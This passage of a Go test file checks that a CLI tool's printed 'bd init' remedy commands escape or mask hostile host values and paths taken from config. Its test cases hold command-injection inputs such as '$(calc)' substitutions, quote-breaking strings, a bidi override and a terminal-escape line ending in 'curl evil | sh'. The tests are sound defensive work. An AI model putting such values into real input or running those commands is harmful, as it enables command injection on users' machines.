		{name: "remote host and port on Windows", goos: "windows", initCmd: "bd init --server", host: "db.example.com", configYAML: "dolt:\n  port: 3310\n", want: `bd init --server --server-host "db.example.com" --server-port 3310 --database <name>`},
		{name: "crafted host on POSIX", goos: "darwin", initCmd: "bd init", host: crafted, want: `bd init --server-host 'x" & calc & "$(calc)' --server-port 3307 --database <name>`},
		{name: "crafted host on Windows", goos: "windows", initCmd: "bd init --server", host: crafted, want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\x22 \x26 calc \x26 \x22\x24(calc)" for <host>`},
		{name: "PowerShell subexpression host on Windows", goos: "windows", initCmd: "bd init", host: "$(calc)", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "\x24(calc)" for <host>`},
		{name: "host a .cmd shim would split on Windows", goos: "windows", initCmd: "bd init", host: "db.example.com;--recreate-missing", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "db.example.com\x3b--recreate-missing" for <host>`},
		{name: "host with terminal control characters on POSIX", goos: "linux", initCmd: "bd init", host: "\x1b[2K\rbd init --server-host db; curl evil | sh #", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "\x1b[2K\rbd init --server-host db\x3b curl evil \x7c sh #" for <host>`},
		{name: "host fish would end the quotes at on POSIX", goos: "linux", initCmd: "bd init --server", host: `x\'; calc #`, want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\\\x27\x3b calc #" for <host>`},
		{name: "host PowerShell would end the quotes at on POSIX", goos: "darwin", initCmd: "bd init", host: "x'; calc #", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\x27\x3b calc #" for <host>`},
		{name: "host with a bidi override on Windows", goos: "windows", initCmd: "bd init --server", host: "db\u202e.example.com", want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "db\u202e.example.com" for <host>`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			beadsDir := t.TempDir()
			if tc.configYAML != "" {
				if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(tc.configYAML), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			got, gotNote := serverInitRemedy(tc.goos, tc.initCmd, beadsDir, tc.host)
			if got != tc.want || gotNote != tc.wantNote {
				t.Errorf("serverInitRemedy(%q, %q, host %q) = %q, %q\nwant %q, %q", tc.goos, tc.initCmd, tc.host, got, gotNote, tc.want, tc.wantNote)
			}
		})
	}
}

// TestRefuseUninitializableTargetEscapesItsPath pins that both server-mode
// refusals name a target whose path holds a control character escaped
// (remedy.PrintedValue), so the path printed ahead of the bd init remedy cannot
// redraw it.
func TestRefuseUninitializableTargetEscapesItsPath(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	t.Parallel()
	for name, configYAML := range map[string]string{
		"dolt.mode: server": "dolt:\n  mode: server\n",
		"remote dolt.host":  "dolt:\n  host: db.example.com\n",
	} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			repo := filepath.Join(t.TempDir(), "repo\x1b[2K\rbd init --database beads #")
			beadsDir := filepath.Join(repo, ".beads")
			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(configYAML), 0o600); err != nil {
				t.Fatal(err)
			}
			err := refuseUninitializableTarget(beadsDir)
			want := strconv.Quote(repo) + " has no metadata.json and its own config selects Dolt server mode"
			if err == nil || !strings.HasPrefix(err.Error(), want) || strings.ContainsAny(err.Error(), "\x1b\r") {
				t.Fatalf("refuseUninitializableTarget() = %q, want a refusal starting %q, with no raw ESC or CR", err, want)
			}
		})
	}
}

// TestRefuseUninitializablePlanningRepoChecksFormatFirst verifies that a
// metadata-less planning .beads in a format this build cannot open is refused
// as that format, before its config.yaml is read: a server-mode or unreadable
// config beside the graph format marker gets the format refusal, not the
// server-mode or unreadable-config one.
func TestRefuseUninitializablePlanningRepoChecksFormatFirst(t *testing.T) {
	for name, configYAML := range map[string]string{
		"server mode":       "dolt:\n  mode: server\n",
		"remote dolt.host":  "dolt:\n  host: db.example.com\n",
		"unreadable config": "dolt: [unterminated\n",
	} {
		t.Run(name, func(t *testing.T) {
			beadsDir := filepath.Join(t.TempDir(), ".beads")
			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
				t.Fatal(err)
			}
			for file, content := range map[string]string{"config.yaml": configYAML, configfile.GraphFormatMarkerFile: ""} {
				if err := os.WriteFile(filepath.Join(beadsDir, file), []byte(content), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			err := refuseUninitializablePlanningRepo(beadsDir)
			var formatErr *configfile.UnsupportedWorkspaceFormatError
			if !errors.As(err, &formatErr) || !formatErr.FormatMarker {
				t.Fatalf("refuseUninitializablePlanningRepo() = %v, want the graph format marker refusal", err)
			}
		})
	}
}
